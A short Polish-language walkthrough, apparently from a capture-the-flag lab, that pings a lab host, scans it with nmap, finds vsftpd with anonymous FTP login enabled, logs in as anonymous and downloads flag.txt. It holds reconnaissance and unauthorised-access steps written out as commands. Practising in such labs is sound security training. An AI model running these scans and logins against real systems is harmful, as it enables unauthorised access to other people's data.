
## Ping do 10.129.164.54 — działa

```bash
ping 10.129.164.54
```
*(Ctrl+C przerwało)*

## Szybkie skanowanie portów na 10.129.164.54

```bash
nmap 10.129.164.54
```

#### 📡 Wynik skanu:

> **port 21/tcp otwarty (FTP)**
## Skanowanie wersji usług na 10.129.164.54

```bash
nmap -sV 10.129.164.54
```

#### 📡 Wynik skanu:

> FTP - vsftpd 3.0.3, OS: Unix

## Komenda do skanowania z opcją -A na porcie 21

```bash
nmap -A -p21 10.129.164.54
```

#### 📡 Wynik skanu:

> FTP anon logowanie dozwolone, plik flag.txt o rozmiarze 32 bajty widoczny.

## Połączenie z FTP na 10.129.164.54

```bash
ftp -p 10.129.164.54
```

```
Name (10.129.164.54:kali): anonymous
Password:
230 Login successful.
```

## Logowanie do FTP jako anonymous

## W FTP:

```bash
ls
get flag.txt
exit
```

## Sprawdzenie pliku flag.txt w katalogu lokalnym

```bash
ls
cat flag.txt
```

## Zrzut tmuxa do pliku

```bash
tmux capture-pane -pS -1000 > zapis.txt
```
